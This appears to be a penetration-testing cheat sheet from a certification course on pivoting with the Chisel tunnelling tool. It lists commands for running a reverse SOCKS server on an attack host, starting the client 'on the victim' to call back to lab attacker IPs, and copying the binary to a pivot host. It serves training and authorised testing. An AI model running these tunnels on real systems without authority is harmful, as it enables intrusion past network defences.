# Chisel

% chisel, pivot, socks, cpts

## Chisel - Chisel - Chisel - Chisel - on-our-machine
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
sudo ./chisel server --reverse
```

## Chisel - Chisel - Chisel - Chisel - on-the-victim
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
chisel.exe client 10.10.14.33:8080 R:socks # Client ip is the attack host
```

## Chisel - Chisel - Chisel - Chisel - proxychains-conf
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
cat /etc/proxychains.conf
```

## Chisel - Chisel - Chisel - Chisel - to-our-machine
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
```

## Chisel - Chisel - Chisel - Chisel - to-our-machine-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
gzip -d chisel_1.7.7_linux_amd64.gz
```

## Chisel - Chisel - Chisel - Chisel - on-the-victime-intermediary-target
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
chisel.exe client 10.10.14.33:8080 R:socks
```

## Chisel - Chisel - Chisel - Chisel - setting-up-using-chisel
#cat/PIVOT/TUNNEL-PORTFW #cpts
Before we can use Chisel, we need to have it on our attack host. If we do not have Chisel on our attack host, we can clone the project repo using the command directly below:

```
git clone https://github.com/jpillora/chisel.git
```

## Chisel - Chisel - Chisel - Chisel - setting-up-using-chisel-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
We will need the programming language Go installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use go build to build the Chisel binary. *Note: Depending

```
cd chisel
```

## Chisel - Chisel - Chisel - Chisel - transferring-chisel-binary-to-pivot-host
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
scp chisel ubuntu@10.129.202.64:~/
```

## Chisel - Chisel - Chisel - Chisel - transferring-chisel-binary-to-pivot-host-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
chisel 100% 11MB 1.2MB/s 00:09
```

## Chisel - Chisel - Chisel - Chisel - transferring-chisel-binary-to-pivot-host-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
Then we can start the Chisel server/listener.

```
:~$ ./chisel server -v -p 1234 --socks5
```

## Chisel - Chisel - Chisel - Chisel - connecting-to-the-chisel-server
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
./chisel client -v 10.129.202.64:1234 socks
```

## Chisel - Chisel - Chisel - Chisel - editing-confirming-proxychainsconf
#cat/PIVOT/TUNNEL-PORTFW #cpts
We can use any text editor we would like to edit the proxychains.conf file, then confirm our configuration changes using tail.

```
tail -f /etc/proxychains.conf
```

## Chisel - Chisel - Chisel - Chisel - starting-the-chisel-server-on-our-attack-host
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
sudo ./chisel server --reverse -v -p 1234 --socks5
```

## Chisel - Chisel - Chisel - Chisel - connecting-the-chisel-client-to-our-attack-host
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
./chisel client -v 10.10.14.17:1234 R:socks
```

